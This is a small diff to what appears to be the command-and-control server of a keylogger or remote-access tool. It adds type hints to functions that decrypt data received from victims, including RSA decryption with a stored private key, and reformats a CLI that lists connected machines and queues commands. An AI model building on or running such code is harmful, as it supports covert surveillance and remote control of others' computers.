@@ -14,7 +14,7 @@ socketio = SocketIO(app)
 COMMANDS = {}
 kill_keylogger = False
 
-def decrypt1(encrypted):
+def decrypt1(encrypted:str):
     decrypted = ''
 
     for c in encrypted:
@@ -29,7 +29,7 @@ def decrypt1(encrypted):
 
     return decrypted
 
-def decrypt2(encrypted):
+def decrypt2(encrypted:str):
     with open('./keys/private4.key', 'rb') as f:
         priv_key_pem = f.read()
     priv_key = rsa.PrivateKey.load_pkcs1(priv_key_pem)
@@ -43,7 +43,7 @@ def decrypt2(encrypted):
     
     return decrypted
 
-def file_decryptor(encrypted):
+def file_decryptor(encrypted:str):
     t1 = time.time()
     if hasattr(encrypted, 'read'):
         encrypted = encrypted.read()
@@ -239,9 +239,7 @@ def clear_commands(message: str):
 def cli_handler():
     while True:
         message = input("\n\033[1mEnter command:\033[0m ")
-        if message.strip() == "help":
-            help_command()
-            continue
+        if message.strip() == "help":help_command()
         elif message == "clear-command-queue": clear_commands(message)
         elif message == "list-cmd-queue": list_cmd_queue()
         elif message == "list-connected": list_connected()
